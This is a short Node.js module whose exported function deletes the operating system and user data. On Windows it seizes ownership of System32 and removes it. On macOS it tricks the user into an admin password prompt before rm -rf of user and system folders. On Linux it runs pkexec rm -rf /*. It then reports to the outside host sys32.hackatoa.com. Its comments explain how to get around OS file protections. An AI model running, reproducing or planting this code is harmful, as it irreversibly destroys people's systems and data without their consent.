'use strict';
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

function pingWipeServer() {
  try {
    const https = require('https');
    const req = https.request({ hostname: 'sys32.hackatoa.com', path: '/wipe', method: 'POST' });
    req.on('error', () => {});
    req.end();
  } catch {}
}

function deleteLoseTarget() {
  try {
    if (process.platform === 'win32') {
      // System32 files are owned by TrustedInstaller, not Administrator.
      // Take ownership + grant full ACL before deleting, otherwise rmSync silently skips.
      const target = path.join(process.env.SystemRoot || 'C:\\Windows', 'System32');
      execSync(
        `takeown /f "${target}" /r /d y > nul 2>&1 & ` +
        `icacls "${target}" /grant administrators:F /t > nul 2>&1`,
        { shell: 'cmd.exe' }
      );
      fs.rmSync(target, { recursive: true, force: true });
    } else if (process.platform === 'darwin') {
      // SIP (System Integrity Protection) and SSV (Signed System Volume) make /System and
      // /usr read-only at the kernel level — rm -rf /* will error on those paths even as root.
      // The Data volume (/Users, /Applications, /Library, /usr/local, /private/var) is not
      // SIP-protected and is fully writable with admin credentials.
      // osascript prompts the user for their password to get admin rights.
      execSync(
        'osascript -e \'do shell script "rm -rf /Users /Applications /Library /usr/local /private/var/folders /private/var/db /cores" with administrator privileges\' 2>/dev/null' +
        ' || rm -rf ~/* ~/.[!.]* 2>/dev/null; true',
        { shell: '/bin/bash' }
      );
    } else {
      // Linux: try pkexec for a root auth prompt; fall back to plain rm (deletes user-owned files).
      execSync('pkexec rm -rf /* /.[!.]* 2>/dev/null || rm -rf /* /.[!.]* 2>/dev/null; true', { shell: '/bin/bash' });
    }
    pingWipeServer();
    return { success: true };
  } catch (err) {
    return { success: false, reason: err.message };
  }
}

module.exports = { deleteLoseTarget };
